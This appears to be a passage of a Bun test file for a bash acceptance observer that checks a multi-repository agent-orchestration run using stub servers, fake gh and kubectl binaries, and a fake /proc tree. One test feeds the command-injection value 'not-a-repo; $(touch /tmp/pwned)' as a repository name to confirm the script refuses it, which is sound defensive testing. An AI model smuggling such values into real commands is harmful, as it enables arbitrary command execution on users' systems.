import { afterAll, afterEach, describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import {
  accessSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

// scripts/e2e/multi-repo-acceptance.sh is the observer for the live multi-repository acceptance
// run. It
// reads only structured sources: the daemon's state JSON (a Bun.serve stub here), Dispatch's own
// JSON API (a second Bun.serve stub, never `dispatch read`'s prose), GitHub's API (a fake `gh`),
// and `kubectl` (a fake binary that really execs what it is given, against a FAKE `/proc` tree
// this suite builds under its own temp directory, via MULTIREPO_PROC_ROOT — never the host's own
// `/proc`, which a shared devbox's live Legion panes would otherwise pollute, picking a sibling
// session's process instead of the test's own). The observer's real in-pod mechanism is
// scripts/e2e/lib/as-role.py, streamed to `python3 -I -` over `kubectl exec -i`: it resolves the
// one worker-shim whose parent is PID 1, its one child whose argv equals the shim's own argv after
// `--` (or behind the install wrapper's exec), and runs the credential probes under that process's
// environment in a probe repository of its own. It runs unmodified here, just against a tree this
// suite fully controls. Every fake, stub and fixture is
// isolated per test; the host's real dispatch/gh/kubectl/proc are never reachable, so this suite
// stays hermetic on any machine, not only a freshly booted CI runner.
const script = join(import.meta.dir, "..", "multi-repo-acceptance.sh");
const dir = mkdtempSync(join(tmpdir(), "multi-repo-acceptance-test."));
afterAll(() => rmSync(dir, { recursive: true, force: true }));

let runs = 0;
let daemonServer: Server | undefined;
let dispatchServer: Server | undefined;

afterEach(() => {
  daemonServer?.stop(true);
  dispatchServer?.stop(true);
  daemonServer = undefined;
  dispatchServer = undefined;
});

function fakeBin(binDir: string, name: string, body: string): void {
  writeFileSync(join(binDir, name), `#!/usr/bin/env bash\n${body}\n`, { mode: 0o755 });
}

const defaultFake = (name: string) => `echo "${name}: unexpected call: $*" >&2; exit 1`;

function realDir(name: string): string {
  for (const candidate of (process.env.PATH ?? "").split(":")) {
    try {
      accessSync(join(candidate, name));
      return candidate;
    } catch {
      /* keep looking */
    }
  }
  throw new Error(`${name} not found on PATH`);
}

function isolatedPath(bin: string): string {
  return [bin, realDir("jq"), realDir("curl"), realDir("base64"), "/usr/bin", "/bin"].join(":");
}

const bashPath = `${realDir("bash")}/bash`;

// realKubectl forwards `exec [-i] <pod> -c <container> -- <rest...>` to a real local exec of
// <rest>, with the caller's stdin: this is what lets the observer's own in-pod prober run
// unmodified, scanning MULTIREPO_PROC_ROOT (a fake tree this suite builds) instead of a real pod's
// `/proc`.
const realKubectl = `
if [ "$1" = exec ]; then
  shift
  if [ "$1" = -i ]; then shift; fi
  shift; shift; shift; shift
  exec "$@"
fi
echo "kubectl: unexpected call: $*" >&2
exit 1`;

function newFakeDir(fakes: { gh?: string; kubectl?: string } = {}) {
  const work = join(dir, `run-${++runs}`);
  const bin = join(work, "bin");
  const evidence = join(work, "evidence");
  mkdirSync(bin, { recursive: true });
  mkdirSync(evidence, { recursive: true });
  fakeBin(bin, "gh", fakes.gh ?? defaultFake("gh"));
  fakeBin(bin, "kubectl", fakes.kubectl ?? defaultFake("kubectl"));
  return { bin, evidence, work };
}

async function spawnScript(
  args: string[],
  path: string,
  evidence: string,
  env: Record<string, string>,
  cwd?: string
) {
  const proc = Bun.spawn([bashPath, script, ...args], {
    env: { PATH: path, MULTIREPO_EVIDENCE_DIR: evidence, ...env },
    stdout: "pipe",
    stderr: "pipe",
    ...(cwd ? { cwd } : {}),
  });
  const [stdout, stderr] = await Promise.all([
    new Response(proc.stdout).text(),
    new Response(proc.stderr).text(),
  ]);
  const status = await proc.exited;
  return { status, stdout, stderr };
}

async function run(
  args: string[],
  env: Record<string, string> = {},
  fakes: { gh?: string; kubectl?: string } = {},
  cwd?: string
) {
  const { bin, evidence } = newFakeDir(fakes);
  const result = await spawnScript(args, isolatedPath(bin), evidence, env, cwd);
  return { ...result, evidence };
}

// ---- a fake /proc tree for second-owner's as_role mechanism ------------------------------
//
// writeProcEntry builds one /proc/<pid>-shaped directory: status (PPid: line), cmdline
// (NUL-separated argv, trailing NUL), and environ (NUL-separated VAR=value pairs, trailing NUL
// when non-empty) — exactly what scripts/e2e/lib/as-role.py reads.
function writeProcEntry(
  root: string,
  pid: string,
  opts: {
    ppid: string;
    cmdline: string[];
    environ?: Record<string, string>;
    unreadableEnviron?: boolean;
  }
): void {
  const procDir = join(root, pid);
  mkdirSync(procDir, { recursive: true });
  writeFileSync(join(procDir, "status"), `Name:\tproc${pid}\nPPid:\t${opts.ppid}\n`);
  writeFileSync(join(procDir, "cmdline"), `${opts.cmdline.join("\0")}\0`);
  const pairs = Object.entries(opts.environ ?? {}).map(([k, v]) => `${k}=${v}`);
  writeFileSync(join(procDir, "environ"), pairs.length > 0 ? `${pairs.join("\0")}\0` : "");
  if (opts.unreadableEnviron) {
    writeFileSync(join(procDir, "environ"), "", { mode: 0o000 });
  }
}

// fakeProcTree builds a minimal pod process tree under a fresh directory: pid 1 (the launcher, no
// role markers), one worker-shim per `shimPids` (default ["7"], parented by `shimParent` —
// default "1" — carrying `-- ` then `agentArgv` (default ["omp","--mode","rpc"]) in its own
// cmdline), and, unless `skipAgent`, one agent child per shim at `shimPid+2` whose own cmdline
// equals exactly that trailing argv — the one as_role must select by argv equality, never by mere
// parentage: with `extraShimChildren`, each shim also gets an `agent-secrets renew` child at
// `shimPid+1` and a `codegraph` child at `shimPid+4`, both real children of the shim carrying its
// own environment but a different argv, exactly as a broker-enrolled pod's shim does for its whole
// life — present to prove the agent is still picked out from among them. `duplicateAgent` adds a
// second child whose argv also matches, for the two-candidates refusal. pid 10 (a descendant of
// the first agent, e.g. a bash tool child, also carrying the role's own environment since it
// inherited it — must NOT be selected, since its parent is the agent, not the shim) and pid 15 (a
// zombie, child of the first agent, empty environ — skipped) are always present. `roleEnviron` is
// every shim and agent's environment (they share one in a real pod).
function fakeProcTree(
  roleEnviron: Record<string, string>,
  opts: {
    shimPids?: string[];
    skipAgent?: boolean;
    agentArgv?: string[];
    extraShimChildren?: boolean;
    duplicateAgent?: boolean;
    shimParent?: string;
  } = {}
): string {
  const root = join(dir, `proc-${++runs}`);
  mkdirSync(root, { recursive: true });
  writeProcEntry(root, "1", { ppid: "0", cmdline: ["launcher"], environ: { PATH: "/usr/bin" } });
  const shimPids = opts.shimPids ?? ["7"];
  const agentArgv = opts.agentArgv ?? ["omp", "--mode", "rpc"];
  const shimParent = opts.shimParent ?? "1";
  for (const shimPid of shimPids) {
    writeProcEntry(root, shimPid, {
      ppid: shimParent,
      cmdline: ["legion", "worker-shim", "--connect", "tcp://x:1", "--", ...agentArgv],
      environ: roleEnviron,
    });
    if (opts.skipAgent) continue;
    const agentPid = String(Number(shimPid) + 2);
    writeProcEntry(root, agentPid, { ppid: shimPid, cmdline: agentArgv, environ: roleEnviron });
    if (opts.extraShimChildren) {
      writeProcEntry(root, String(Number(shimPid) + 1), {
        ppid: shimPid,
        cmdline: ["agent-secrets", "renew", "--pod-token-file", "/x"],
        environ: roleEnviron,
      });
      writeProcEntry(root, String(Number(shimPid) + 4), {
        ppid: shimPid,
        cmdline: ["codegraph"],
        environ: roleEnviron,
      });
    }
    if (opts.duplicateAgent) {
      writeProcEntry(root, String(Number(shimPid) + 5), {
        ppid: shimPid,
        cmdline: agentArgv,
        environ: roleEnviron,
      });
    }
  }
  writeProcEntry(root, "10", {
    ppid: "9",
    cmdline: ["bash", "-c", "sleep 1"],
    environ: roleEnviron,
  });
  writeProcEntry(root, "15", { ppid: "9", cmdline: ["zombie"], environ: {} });
  return root;
}

const tokenFile = join(dir, "dispatch-token");
writeFileSync(tokenFile, "dispatch-bearer\n");

const fullInputs = (daemonUrl: string, dispatchUrl: string): Record<string, string> => ({
  LEGION_E2E_REPO_T: "acme/widgets",
  LEGION_E2E_REPO_C: "acme/gadgets",
  LEGION_E2E_PIN_FILE: "toolchain-pin.txt",
  LEGION_E2E_REPO_X: "other/outside",
  LEGION_E2E_REPO_O: "zeta/tools",
  LEGION_E2E_DAEMON_URL: daemonUrl,
  DISPATCH_URL: dispatchUrl,
  DISPATCH_TOKEN_FILE: tokenFile,
});

// A fixed daemon /legion/v1/state body, overridable per test.
function makeStateBody(overrides: Record<string, unknown> = {}): string {
  return JSON.stringify({
    daemon: { project: "ACME" },
    admission: { cap: 1, active: [], waiting: [] },
    issues: {
      "ACME-2": {
        key: "ACME-2",
        generation: 1,
        phase: "implementing",
        status: "todo",
        repo: "acme/widgets",
      },
      "ACME-3": {
        key: "ACME-3",
        generation: 1,
        phase: "implementing",
        status: "todo",
        repo: "acme/gadgets",
      },
    },
    pendingStatusWrites: [],
    strandedClaims: [],
    capabilities: [],
    repositories: { owners: [], mapped: [], refused: [], caches: [] },
    ...overrides,
  });
}
const stateBody = makeStateBody();

function daemonStub(body: string = stateBody): Server {
  return Bun.serve({
    port: 0,
    fetch(req) {
      const url = new URL(req.url);
      if (url.pathname === "/healthz") return Response.json({ status: "ok" });
      if (url.pathname === "/legion/v1/state") {
        return new Response(body, { headers: { "content-type": "application/json" } });
      }
      return new Response("not found", { status: 404 });
    },
  });
}

// mutableDaemonStub is daemonStub whose /legion/v1/state body can change after the server starts,
// without changing its URL: the baseline protocol binds a baseline to the daemon URL it captured
// against, so a test that must change the daemon's answer between `before` and `after` needs the
// same server, not a fresh one on a new port.
function mutableDaemonStub(initial: string): { server: Server; setBody: (body: string) => void } {
  let body = initial;
  const server = Bun.serve({
    port: 0,
    fetch(req) {
      const url = new URL(req.url);
      if (url.pathname === "/healthz") return Response.json({ status: "ok" });
      if (url.pathname === "/legion/v1/state") {
        return new Response(body, { headers: { "content-type": "application/json" } });
      }
      return new Response("not found", { status: 404 });
    },
  });
  return {
    server,
    setBody: (next: string) => {
      body = next;
    },
  };
}

// dispatchStub serves Dispatch's own GET /api/v1/issues/:key and /events, as issues/events map
// key -> response body (a JSON string). A key with no entry answers 404.
function dispatchStub(issues: Record<string, string>, events: Record<string, string> = {}): Server {
  return Bun.serve({
    port: 0,
    fetch(req) {
      const url = new URL(req.url);
      const eventsMatch = url.pathname.match(/^\/api\/v1\/issues\/([^/]+)\/events$/);
      if (eventsMatch) {
        const key = eventsMatch.at(1) ?? "";
        if (key in events)
          return new Response(events[key], { headers: { "content-type": "application/json" } });
        return new Response(JSON.stringify([]), {
          headers: { "content-type": "application/json" },
        });
      }
      const issueMatch = url.pathname.match(/^\/api\/v1\/issues\/([^/]+)$/);
      if (issueMatch) {
        const key = issueMatch.at(1) ?? "";
        if (key in issues)
          return new Response(issues[key], { headers: { "content-type": "application/json" } });
        return new Response(JSON.stringify({ error: "not found" }), { status: 404 });
      }
      return new Response("not found", { status: 404 });
    },
  });
}

// daemonActorEvent is one event with the daemon's own exact actor identity
// (legion-daemon:<PROJECT>, internal/dispatch/client.go:287-289), a seq, and a message.created
// body.
function daemonActorEvent(
  project: string,
  seq: number,
  body: string,
  createdAt = "2026-01-01T00:00:00Z"
): {
  type: string;
  seq: number;
  actor: { kind: string; id: string };
  created_at: string;
  payload: { body: string };
} {
  return {
    type: "message.created",
    seq,
    actor: { kind: "session", id: `legion-daemon:${project}` },
    created_at: createdAt,
    payload: { body },
  };
}

// humanActorEvent is one message.created event from a human (or any non-daemon actor): a stale or
// quoted daemon sentence from a human never satisfies a daemon-message matcher.
function humanActorEvent(body: string, createdAt = "2026-01-01T00:00:00Z") {
  return {
    type: "message.created",
    seq: 1,
    actor: { kind: "user", id: "u1" },
    created_at: createdAt,
    payload: { body },
  };
}

// issueUpdatedEvent is one issue.updated event, seq-numbered, carrying the issue's repo in its
// payload (the whole issue, repo included — model.go, issue_patch.go:407).
function issueUpdatedEvent(seq: number, repo: string | null, createdAt = "2026-01-01T00:00:00Z") {
  return {
    type: "issue.updated",
    seq,
    actor: { kind: "session", id: "legion-daemon:ACME" },
    created_at: createdAt,
    payload: { repo },
  };
}

const noneNote =
  "Legion did not admit this issue: its repository resolves to none. Set its repository (the issue header's Repository picker, or dispatch issue-update --repo owner/name) and move it to todo again.";

describe("usage: an absent or invalid observation is refused before any env, tool, or network check", () => {
  test("no observation named: exit 2, with no env set and no PATH at all", async () => {
    const work = join(dir, `run-${++runs}`);
    mkdirSync(work, { recursive: true });
    const { status, stderr } = await spawnScript([], "", work, {});
    expect(status).toBe(2);
    expect(stderr).toContain("usage:");
  });

  test("negative pr-in-x without before|after is refused usage, exit 2", async () => {
    const work = join(dir, `run-${++runs}`);
    mkdirSync(work, { recursive: true });
    const { status } = await spawnScript(["negative", "pr-in-x", "ACME-2"], "", work, {});
    expect(status).toBe(2);
  });

  test("negative pr-in-x after with the wrong argument count is refused usage, exit 2", async () => {
    const work = join(dir, `run-${++runs}`);
    mkdirSync(work, { recursive: true });
    const { status } = await spawnScript(["negative", "pr-in-x", "after", "run-1"], "", work, {});
    expect(status).toBe(2);
  });
});

describe("required inputs", () => {
  test("every input unset: the refusal names the first missing one", async () => {
    const { status, stderr } = await run(["done", "X-1"], {});
    expect(status).not.toBe(0);
    expect(stderr).toContain("LEGION_E2E_REPO_T is unset");
  });

  test("each input missing in turn names itself", async () => {
    const all = fullInputs("http://127.0.0.1:1", "http://127.0.0.1:1");
    for (const name of Object.keys(all)) {
      const env = { ...all };
      delete (env as Record<string, string>)[name];
      const { status, stderr } = await run(["done", "X-1"], env);
      expect(status).not.toBe(0);
      expect(stderr).toContain(`${name} is unset`);
    }
  });
});

describe("repository shape and collisions", () => {
  test("a malformed repository value is refused before any network read", async () => {
    const env = fullInputs("http://127.0.0.1:1", "http://127.0.0.1:1");
    env.LEGION_E2E_REPO_T = "not-a-repo; $(touch /tmp/pwned)";
    const { status, stderr } = await run(["done", "X-1"], env);
    expect(status).not.toBe(0);
    expect(stderr).toContain("not an owner/name repository");
  });

  test("T and O sharing an owner in a different case is still refused (case-insensitive)", async () => {
    const env = fullInputs("http://127.0.0.1:1", "http://127.0.0.1:1");
    env.LEGION_E2E_REPO_T = "Acme/widgets";
    env.LEGION_E2E_REPO_O = "ACME/other-repo";
    const { status, stderr } = await run(["done", "X-1"], env);
    expect(status).not.toBe(0);
    expect(stderr).toContain("share an owner");
  });

  test("two repository variables naming the same repository in different case is still refused", async () => {
    const env = fullInputs("http://127.0.0.1:1", "http://127.0.0.1:1");
    env.LEGION_E2E_REPO_C = "ACME/Widgets";
    const { status, stderr } = await run(["done", "X-1"], env);
    expect(status).not.toBe(0);
    expect(stderr).toContain("both name");
  });
});

describe("the daemon health refusal", () => {
  test("a stub whose /healthz answers 404 is refused, naming the status", async () => {
    daemonServer = Bun.serve({ port: 0, fetch: () => new Response("not found", { status: 404 }) });
    const env = fullInputs(`http://127.0.0.1:${daemonServer.port}`, "http://127.0.0.1:1");
    const { status, stderr } = await run(["done", "X-1"], env);
    expect(status).not.toBe(0);
    expect(stderr).toContain(
      `LEGION_E2E_DAEMON_URL http://127.0.0.1:${daemonServer.port} is not a Legion daemon`
    );
  });
});

describe("children: structured Dispatch + state agreement, with raw evidence", () => {
  test("one child resolves to T and one to C in both Dispatch and the daemon's state: PASS, with raw reads kept", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({
      "ACME-1": JSON.stringify({ key: "ACME-1", children: [{ key: "ACME-2" }, { key: "ACME-3" }] }),
      "ACME-2": JSON.stringify({
        key: "ACME-2",
        repo: "acme/widgets",
        resolved_repo: "acme/widgets",
      }),
      "ACME-3": JSON.stringify({
        key: "ACME-3",
        repo: "acme/gadgets",
        resolved_repo: "acme/gadgets",
      }),
    });
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { status, stdout, evidence } = await run(["children", "ACME-1"], env);
    expect(status).toBe(0);
    expect(stdout).toContain("CHECK children: PASS");
    expect(stdout).toContain("ACME-2: dispatch=acme/widgets state=acme/widgets");
    // The raw Dispatch and state reads this observation judged are kept, not just a summary,
    // named per observation (children-*), never a bare state.raw every observation shares.
    expect(
      JSON.parse(readFileSync(join(evidence, "children-dispatch-issue-ACME-2.raw"), "utf8"))
        .resolved_repo
    ).toBe("acme/widgets");
    expect(
      JSON.parse(readFileSync(join(evidence, "children-state.raw"), "utf8")).issues["ACME-2"].repo
    ).toBe("acme/widgets");
  });

  test("a child Dispatch and the daemon's state disagree on: FAIL", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({
      "ACME-1": JSON.stringify({ key: "ACME-1", children: [{ key: "ACME-2" }, { key: "ACME-3" }] }),
      "ACME-2": JSON.stringify({
        key: "ACME-2",
        repo: "acme/gadgets",
        resolved_repo: "acme/gadgets",
      }),
      "ACME-3": JSON.stringify({
        key: "ACME-3",
        repo: "acme/gadgets",
        resolved_repo: "acme/gadgets",
      }),
    });
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { status, stderr } = await run(["children", "ACME-1"], env);
    expect(status).not.toBe(0);
    expect(stderr).toContain("CHECK children: FAIL");
  });
});

describe("done: Dispatch's structured .status field", () => {
  test("every named issue reading status done is a PASS", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({
      "ACME-2": JSON.stringify({ key: "ACME-2", status: "done" }),
      "ACME-3": JSON.stringify({ key: "ACME-3", status: "done" }),
    });
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { status, stdout } = await run(["done", "ACME-2", "ACME-3"], env);
    expect(status).toBe(0);
    expect(stdout).toContain("CHECK done: PASS");
  });

  test("one issue still todo is a FAIL", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({ "ACME-2": JSON.stringify({ key: "ACME-2", status: "todo" }) });
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { status, stderr } = await run(["done", "ACME-2"], env);
    expect(status).not.toBe(0);
    expect(stderr).toContain("CHECK done: FAIL");
  });
});

describe("a failed Dispatch read never prints the bearer", () => {
  test("done against a 404'd issue fails without the Dispatch token anywhere in stdout or stderr", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { status, stdout, stderr } = await run(["done", "ACME-404"], env);
    expect(status).not.toBe(0);
    expect(stdout).not.toContain("dispatch-bearer");
    expect(stderr).not.toContain("dispatch-bearer");
    expect(stderr).not.toContain("Authorization");
    expect(stderr).toContain("GET");
    expect(stderr).toContain("failed");
  });
});

// A SIGTERM to the observer's own pid, outside any process group signal,
// must stop the script immediately with the shell's conventional 143 — not clean up and press on
// into a later, unrelated read that then fails for the wrong reason — and a group signal (every
// process in the pipeline, curl included) must not leave a raw_fetch temp file behind even though
// most raw_fetch calls run inside a `$(...)` subshell, where a plain variable a signal handler
// reads in the parent is never set.
//
// Both tests send a real OS signal to a real bash subprocess mid-fetch and then wait on its real
// exit: there is no in-process JS timer to fake here (the clock being driven is the kernel's, not
// Bun's), so a real `Bun.sleep` window for the signal to land mid-request, and a real slow HTTP
// response to hold that window open, are the only way to exercise this.
describe("an interrupted run cleans up and actually stops", () => {
  test("a SIGTERM to the observer's own pid stops it immediately with exit 143, not a later failure", async () => {
    daemonServer = Bun.serve({
      port: 0,
      async fetch(req) {
        const url = new URL(req.url);
        if (url.pathname === "/healthz") return Response.json({ status: "ok" });
        if (url.pathname === "/legion/v1/state") {
          await Bun.sleep(3000);
          return new Response(stateBody, { headers: { "content-type": "application/json" } });
        }
        return new Response("not found", { status: 404 });
      },
    });
    dispatchServer = dispatchStub({
      "ACME-1": JSON.stringify({ key: "ACME-1", children: [{ key: "ACME-2" }] }),
      "ACME-2": JSON.stringify({ key: "ACME-2", resolved_repo: "acme/widgets" }),
    });
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { bin, evidence } = newFakeDir();
    const proc = Bun.spawn([bashPath, script, "children", "ACME-1"], {
      env: { PATH: isolatedPath(bin), MULTIREPO_EVIDENCE_DIR: evidence, ...env },
      stdout: "pipe",
      stderr: "pipe",
    });
    await Bun.sleep(300); // real wait: lets the real subprocess reach its real slow fetch
    process.kill(proc.pid, "SIGTERM");
    const status = await proc.exited;
    expect(status).toBe(143);
  });

  test("a group SIGINT removes a raw_fetch temp file created inside a $(...) subshell", async () => {
    daemonServer = Bun.serve({
      port: 0,
      async fetch(req) {
        const url = new URL(req.url);
        if (url.pathname === "/healthz") return Response.json({ status: "ok" });
        if (url.pathname === "/legion/v1/state") {
          await Bun.sleep(3000);
          return new Response(stateBody, { headers: { "content-type": "application/json" } });
        }
        return new Response("not found", { status: 404 });
      },
    });
    dispatchServer = dispatchStub({
      "ACME-1": JSON.stringify({ key: "ACME-1", children: [{ key: "ACME-2" }] }),
      "ACME-2": JSON.stringify({ key: "ACME-2", resolved_repo: "acme/widgets" }),
    });
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { bin, evidence } = newFakeDir();
    const proc = Bun.spawn(["setsid", "--", bashPath, script, "children", "ACME-1"], {
      env: { PATH: isolatedPath(bin), MULTIREPO_EVIDENCE_DIR: evidence, ...env },
      stdout: "pipe",
      stderr: "pipe",
    });
    await Bun.sleep(300); // real wait: lets the real subprocess reach its real slow fetch
    process.kill(-proc.pid, "SIGINT");
    const status = await proc.exited;
    expect(status).toBe(130);
    const stray = readdirSync(evidence).filter((f) => /\.raw\.[^.]{6}$/.test(f));
    expect(stray).toEqual([]);
  });
});

describe("raw evidence is named per observation, never overwritten by a later one", () => {
  test("children's state.raw survives a later, different observation's own state read", async () => {
    const { server, setBody } = mutableDaemonStub(
      makeStateBody({
        issues: {
          "ACME-2": {
            key: "ACME-2",
            generation: 1,
            phase: "implementing",
            status: "todo",
            repo: "acme/widgets",
          },
          "ACME-3": {
            key: "ACME-3",
            generation: 1,
            phase: "implementing",
            status: "todo",
            repo: "acme/gadgets",
          },
        },
      })
    );
    daemonServer = server;
    dispatchServer = dispatchStub({
      "ACME-1": JSON.stringify({ key: "ACME-1", children: [{ key: "ACME-2" }, { key: "ACME-3" }] }),
      "ACME-2": JSON.stringify({
        key: "ACME-2",
        repo: "acme/widgets",
        resolved_repo: "acme/widgets",
      }),
      "ACME-3": JSON.stringify({
        key: "ACME-3",
        repo: "acme/gadgets",
        resolved_repo: "acme/gadgets",
      }),
      "ACME-9": JSON.stringify({ key: "ACME-9", resolved_repo: null }),
    });
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { bin, evidence } = newFakeDir();
    const path = isolatedPath(bin);
    const children1 = await spawnScript(["children", "ACME-1"], path, evidence, env);
    expect(children1.status).toBe(0);
    const childrenStateBefore = readFileSync(join(evidence, "children-state.raw"), "utf8");
    // The daemon's state moves on (ACME-9 now admitted) before a later, unrelated observation
    // reads it; children's own raw read must still be what it actually read, not this one.
    setBody(
      makeStateBody({
        issues: {
          "ACME-9": {
            key: "ACME-9",
            generation: 1,
            phase: "implementing",
            status: "todo",
            repo: "acme/widgets",
          },
        },
      })
    );
    await spawnScript(["negative", "no-repo", "ACME-9"], path, evidence, env);
    const childrenStateAfter = readFileSync(join(evidence, "children-state.raw"), "utf8");
    expect(childrenStateAfter).toBe(childrenStateBefore);
    expect(readFileSync(join(evidence, "negative-no-repo-state.raw"), "utf8")).not.toBe(
      childrenStateBefore
    );
  });

  // A state read made fresh per child could judge an early child against
  // one read and a later child against a different one the daemon moved to meanwhile, while the
  // kept evidence could only ever hold the last — contradicting the judgment of a child read before it.
  // children reads state exactly once, before any child's judgment.
  test("children reads state exactly once for a multi-child parent, never once per child", async () => {
    let stateRequests = 0;
    daemonServer = Bun.serve({
      port: 0,
      fetch(req) {
        const url = new URL(req.url);
        if (url.pathname === "/healthz") return Response.json({ status: "ok" });
        if (url.pathname === "/legion/v1/state") {
          stateRequests += 1;
          return new Response(
            makeStateBody({
              issues: {
                "ACME-2": { key: "ACME-2", repo: "acme/widgets" },
                "ACME-3": { key: "ACME-3", repo: "acme/gadgets" },
              },
            }),
            { headers: { "content-type": "application/json" } }
          );
        }
        return new Response("not found", { status: 404 });
      },
    });
    dispatchServer = dispatchStub({
      "ACME-1": JSON.stringify({ key: "ACME-1", children: [{ key: "ACME-2" }, { key: "ACME-3" }] }),
      "ACME-2": JSON.stringify({
        key: "ACME-2",
        repo: "acme/widgets",
        resolved_repo: "acme/widgets",
      }),
      "ACME-3": JSON.stringify({
        key: "ACME-3",
        repo: "acme/gadgets",
        resolved_repo: "acme/gadgets",
      }),
    });
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { status, stdout } = await run(["children", "ACME-1"], env);
    expect(status).toBe(0);
    expect(stdout).toContain("CHECK children: PASS");
    expect(stateRequests).toBe(1);
  });
});

describe("record-head and pin: empty/invalid values never pass, trailing bytes kept", () => {
  test("record-head refuses a repository argument that is not T", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { status, stderr } = await run(["record-head", "acme/gadgets"], env, {});
    expect(status).not.toBe(0);
    expect(stderr).toContain("not LEGION_E2E_REPO_T");
  });

  test("an empty commit sha from GitHub is never recorded as the head: FAIL, not PASS", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const gh = `
case "$*" in
  "api repos/acme/widgets --jq .default_branch") printf 'main' ;;
  "api repos/acme/widgets/branches/main --jq .commit.sha") printf '' ;;
  *) echo "gh: unexpected call: $*" >&2; exit 1 ;;
esac`;
    const { status, stderr } = await run(["record-head", "acme/widgets"], env, { gh });
    expect(status).not.toBe(0);
    expect(stderr).toContain("CHECK record-head: FAIL");
  });

  test("a well-formed record-head is a PASS", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const sha = "a".repeat(40);
    const gh = `
case "$*" in
  "api repos/acme/widgets --jq .default_branch") printf 'main' ;;
  "api repos/acme/widgets/branches/main --jq .commit.sha") printf '${sha}' ;;
  *) echo "gh: unexpected call: $*" >&2; exit 1 ;;
esac`;
    const { status, stdout } = await run(["record-head", "acme/widgets"], env, { gh });
    expect(status).toBe(0);
    expect(stdout).toContain(sha);
    expect(stdout).toContain("CHECK record-head: PASS");
  });

  test("pin refuses an empty merge-sha argument", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { status, stderr } = await run(["pin", "acme/gadgets", ""], env, {});
    expect(status).not.toBe(0);
    expect(stderr).toContain("not a full 40-character commit id");
  });

  // A pin file ending in two newlines must keep both in evidence/pin.txt.
  test("the pin file's trailing bytes (two trailing newlines) are kept exactly in evidence", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const sha = "b".repeat(40);
    const pinContent = `pin: ${sha}\n\n`;
    const b64 = Buffer.from(pinContent).toString("base64");
    const gh = `
case "$*" in
  "api repos/acme/gadgets --jq .default_branch") printf 'main' ;;
  "api repos/acme/gadgets/contents/toolchain-pin.txt?ref=main --jq .content") printf '${b64}' ;;
  *) echo "gh: unexpected call: $*" >&2; exit 1 ;;
esac`;
    const { status, evidence } = await run(["pin", "acme/gadgets", sha], env, { gh });
    expect(status).toBe(0);
    const written = readFileSync(join(evidence, "pin.txt"));
    expect(written.length).toBe(Buffer.byteLength(pinContent));
    expect(written.toString()).toBe(pinContent);
  });
});

describe("pin compares the pinned commit exactly; a branch name and an issue key never change a request", () => {
  const pinGh = (path: string, content: string, branch = "main", encodedRef = branch) => `
case "$*" in
  "api repos/acme/gadgets --jq .default_branch") printf '${branch}' ;;
  "api repos/acme/gadgets/contents/${path}?ref=${encodedRef} --jq .content") printf '${Buffer.from(content).toString("base64")}' ;;
  *) echo "gh: unexpected call: $*" >&2; exit 1 ;;
esac`;

  // The pin is the one commit id the file holds. The sha in a comment beside a pin naming another
  // commit, or inside a longer hex string, is not the pin.
  test("a pin file naming another commit, with the sha only in a comment, is a FAIL", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const sha = "b".repeat(40);
    const gh = pinGh("toolchain-pin.txt", `# previous: ${sha}\npin: ${"c".repeat(40)}\n`);
    const { status, stderr } = await run(["pin", "acme/gadgets", sha], env, { gh });
    expect(status).not.toBe(0);
    expect(stderr).toContain("CHECK pin: FAIL");
  });

  test("a pin file whose only hex string is longer than the sha (one containing it) is a FAIL", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const sha = "b".repeat(40);
    const gh = pinGh("toolchain-pin.txt", `sha256: ${sha}${"0".repeat(24)}\n`);
    const { status, stderr } = await run(["pin", "acme/gadgets", sha], env, { gh });
    expect(status).not.toBe(0);
